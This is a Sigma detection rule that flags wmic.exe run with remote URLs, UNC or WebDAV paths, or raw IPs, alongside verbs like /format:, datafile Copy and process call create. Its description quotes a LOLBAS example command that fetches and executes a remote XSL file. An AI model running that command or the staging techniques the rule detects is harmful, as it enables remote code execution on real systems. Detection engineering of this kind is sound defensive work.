title: CNC-E-2726320-501-WMIC URL/UNC/WebDAV or Raw-IP on Command Line (Proc Creation)
id: 2726320-501-wmic-proc-url-unc-webdav-ip
status: test
description: |
  Detects legacy WMI CLI **wmic.exe** launched with command lines indicating **ingress tool transfer** via
  remote resources: URL schemes (`http://`, `https://`, `ftp://`, generic `://`), **UNC paths** (e.g., `\\server\share`),
  or **WebDAV UNC markers** (**DavWWWRoot**, **@SSL**) which instruct the Windows WebDAV redirector to use HTTP/HTTPS.
  High-signal combinations include WMIC’s **/FORMAT:** pointing to a **remote XSL** (fetch + execute via MSXML),
  as documented in LOLBAS, for example:
    wmic.exe process get brief /format:"\\servername\C$\Windows\Temp\file.xsl"
  Additional native verbs often seen with ingress/staging are included as hints:
    - **process get / list brief** (commonly paired with `/format:`)
    - **datafile ... call Copy** (local file staging into user-writable paths)
    - **process call create** (orchestrates native downloaders)
  Use this as the **primary process-creation anchor** and correlate with network/file telemetry.
author: Mohamed Hanii
date: 2025-10-25
references:
  - https://lolbas-project.github.io/lolbas/Binaries/Wmic/                  
  - https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic            
  - https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/copy-method-in-class-cim-datafile  
tags:
  - attack.command_and_control
  - attack.t1220        # XSL Script Processing (remote XSL fetch + script execution)
  - attack.t1105        # Ingress Tool Transfer (remote resource fetch / staging)
  - windows
  - process_creation

logsource:
  product: windows
  category: process_creation

detection:
  # ---- Sysmon (EID 1)
  sel_sysmon_eid1:
    EventID: 1
  sel_sysmon_img:
    Image|endswith: '\wmic.exe'
  sel_sysmon_ofn:
    OriginalFileName|contains|all:
      - 'wmic'                 # typical OFN is "wmic.exe"

  # URL schemes and generic '://'
  sel_sysmon_url:
    CommandLine|contains:
      - 'http://'
      - 'https://'
      - 'ftp://'
      - '://'

  # UNC & WebDAV markers (generic UNC, WebDAV root, HTTPS WebDAV)
  sel_sysmon_unc:
    CommandLine|contains:
      - '\\\\'                 # generic UNC
      - 'DavWWWRoot'           # WebDAV UNC root
      - '@SSL'                 # HTTPS WebDAV UNC hint

  # Raw IPv4 with optional :port (allow trailing quotes/spaces)
  sel_sysmon_rawip:
    CommandLine|re: '(?i)(?:^|\\s)(?:[0-9]{1,3}\\.){3}[0-9]{1,3}(?::[0-9]{1,5})?(?:["\\s]*$)'

  # WMIC-native "ingress hints": /format, get/list brief, datafile Copy, process call create
  sel_sysmon_wmic_hints:
    CommandLine|contains:
      - ' /format:'
      - ' get '
      - ' list brief'
      - ' datafile '
      - ' call Copy'
      - ' process call create'

  # ---- Windows Security (EID 4688)
  sel_4688_eid:
    EventID: 4688
  sel_4688_img:
    NewProcessName|endswith: '\wmic.exe'

  sel_4688_url:
    ProcessCommandLine|contains:
      - 'http://'
      - 'https://'
      - 'ftp://'
      - '://'

  sel_4688_unc:
    ProcessCommandLine|contains:
      - '\\\\'
      - 'DavWWWRoot'
      - '@SSL'

  sel_4688_rawip:
    ProcessCommandLine|re: '(?i)(?:^|\\s)(?:[0-9]{1,3}\\.){3}[0-9]{1,3}(?::[0-9]{1,5})?(?:["\\s]*$)'

  sel_4688_wmic_hints:
    ProcessCommandLine|contains:
      - ' /format:'
      - ' get '
      - ' list brief'
      - ' datafile '
      - ' call Copy'
      - ' process call create'

  condition: >
    (
      sel_sysmon_eid1 and (sel_sysmon_img or sel_sysmon_ofn) and
      (sel_sysmon_url or sel_sysmon_unc or sel_sysmon_rawip) and sel_sysmon_wmic_hints
    )
    or
    (
      sel_4688_eid and sel_4688_img and
      (sel_4688_url or sel_4688_unc or sel_4688_rawip) and sel_4688_wmic_hints
    )

falsepositives:
  - Legitimate WebDAV/SharePoint access using UNC like \\<tenant>.sharepoint.com@SSL\DavWWWRoot\... (baseline approved tenants/shares). WebDAV UNC markers are uncommon in admin scripts but do exist in some enterprises.
  - Internal automation that renders WMIC output via /format: with **internal** XSL stored on SMB/SharePoint; allowlist sanctioned hosts/shares.
  - Legacy admin tasks using datafile Copy or process call create for deployments—validate signer, maintenance windows, and destinations.
level: high
